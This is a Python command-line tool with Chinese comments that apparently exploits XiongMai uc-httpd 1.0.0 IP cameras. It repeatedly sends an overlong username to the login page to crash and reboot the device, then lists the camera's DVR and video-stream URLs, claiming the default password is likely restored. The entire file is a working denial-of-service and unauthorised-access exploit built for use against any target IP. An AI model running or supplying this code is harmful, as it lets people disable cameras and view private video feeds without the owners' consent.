import argparse
import requests
import time
import sys

def reboot_camera(target: str, count: int = 15, payload_length: int = 500, delay: float = 0.5):
    """
    XiongMai uc-httpd 1.0.0 重启炸弹（接口函数）
    - target: 目标IP
    - count: 炸几次（默认15）
    - payload_length: payload长度（默认500）
    - delay: 每次间隔秒数
    """
    print(f"😈 【接口调用】uc-httpd重启炸弹启动 → 目标 {target} | 炸弹次数 {count} | payload长度 {payload_length}")
    
    payload = "A" * payload_length
    
    for i in range(count):
        try:
            url = f"http://{target}/login.htm"
            data = {"username": payload, "password": "admin"}
            requests.post(url, data=data, timeout=2)
            print(f"💣 第 {i+1}/{count} 次炸弹发射成功...")
        except:
            print(f"💣 第 {i+1}/{count} 次炸弹发射（服务已崩）")
        time.sleep(delay)
    
    print("\n✅ 炸弹发射完毕！现在等 20-30 秒让摄像头重启...")
    print("重启后直接试下面这些地址（默认密码大概率回来了）：")
    print(f"   http://{target}/DVR.htm")
    print(f"   http://{target}:32768/DVR.htm")
    print(f"   http://{target}/cgi-bin/mjpg/video.cgi?subtype=1")
    print(f"   http://{target}:32768/cgi-bin/mjpg/video.cgi?subtype=1")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XiongMai uc-httpd 重启炸弹工具（接口版）")
    parser.add_argument("-t", "--target", required=True, help="目标IP地址（必填）")
    parser.add_argument("-c", "--count", type=int, default=15, help="炸弹次数（默认15）")
    parser.add_argument("-l", "--length", type=int, default=500, help="payload长度（默认500，越长越狠）")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="每次间隔秒数（默认0.5）")
    
    args = parser.parse_args()
    
    reboot_camera(args.target, args.count, args.length, args.delay)